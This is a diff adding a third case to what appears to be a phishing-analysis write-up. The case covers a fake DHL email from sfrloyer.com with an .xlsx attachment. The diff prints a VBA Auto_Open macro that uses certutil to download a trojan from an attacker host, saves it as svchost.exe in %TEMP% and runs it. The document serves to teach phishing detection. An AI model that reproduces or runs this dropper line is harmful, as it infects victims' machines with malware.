@@ -67,3 +67,18 @@ Sent using **PHPMailer** from the send_phish.php script. This indicates that thi
 ```
 
 * **Why & Findings :** A hidden link manipulation technique (hidden redirection) has been discovered. Attackers disguise links to make them appear safe in the body of an email, but the HTML code redirects users to the attacker’s server.
+
+**Case 3**
+
+![Ikon Email](Image/email3.png)
+
+* **What:** This email may be malicious because it was not sent by DHL, but by **sfrloyer.com**
+  ```
+  Return-Path: <noreply@sfrloyer.com>
+  ```
+* **How:** The attacker sends a file purporting to be a notification from DHL. However, there is something suspicious about it: the file is in .xlsx format. Once the target opens the file, a script from the attacker runs automatically to download a malicious file from the attacker’s server and execute it immediately.
+  ```
+  Sub Auto_Open()
+  Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
+```
+
